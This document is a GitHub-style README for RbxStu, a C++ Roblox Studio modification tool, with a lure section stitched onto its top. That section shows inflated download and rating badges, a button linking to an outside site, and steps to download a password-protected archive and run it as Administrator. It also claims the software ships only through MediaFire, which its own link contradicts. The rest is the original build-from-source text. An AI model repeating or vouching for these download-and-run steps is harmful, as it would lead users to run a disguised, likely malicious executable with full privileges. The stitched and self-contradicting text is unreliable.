<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Features:

- Stable execution.
- Clean, unrestricted and raw execution (Adding environment on the coming days).
- Maintainable and **_EXPANDABLE_** codebase.

Whilst RbxStu was born as a project to make a pentesting tool, this codebase allows for more than that, it allows for a
base framework to be defined in which Roblox Studio modifications can be built in C++, the project does not have a
current way of interacting with it, but it is on the "TODO" list to add a way of communicating with the DLL on your own
DLL! So that if you want to make your own Roblox Studio modification, you will not need a heavy, big base, and can start
fairly light!

### Is this allowed by Roblox?

Whilst Roblox has a no reverse engineering policy, it is not enforced necessarily for anything Roblox Studio related, as
this would be unwise, it is a development tool, and anything that happens to it will not truly impact players on the
release client.

### Is this vulnerable to 'x' or 'y'?

RbxStu cannot guarantee your safety when executing scripts. It does its best to prevent really nasty things from
happening, but Roblox will over time add new services that they will internally use that expose dangerous functions,
such as one to save debug data, which allows you to write bat files, and then one that allows you to execute things, all
because we are on a high security context we were never meant to truly use.

## Dependencies:

- vcpkg cmake toolchain script (Add CMake option `-DVCPKG_TARGET_TRIPLET=x64-windows-static` as well)
- CLion 2024.2
- MSVC
- Ninja build system (Prepackaged with CLion)

## Building

#### Requirements

- CMake
- MSVC
- Ninja
- vcpkg
- CLion (contains all of the above besides MSVC)

### Clion

1. Set environment variable `VCPKG_ROOT` to the path of your vcpkg installation. (If windows feels goofy you might need to
   restart your computer)
2. Open the project in CLion.
3. Set the CMake profile to any of the presets and enable it (example: `Release`, `Debug`, `RelWithDebInfo`).
4. Build the project.

### CMake/Ninja

1. Set environment variable `VCPKG_ROOT` to the path of your vcpkg installation. (If windows feels goofy you might need to
   restart your computer)
3. Open `x64 Native Tools Command Prompt for VS 2022` or similar with access to msvc tools.
2. Run the following commands in the project root directory:

```shell
cmake --preset={preset name here}
cmake --build --preset={preset name here}
```
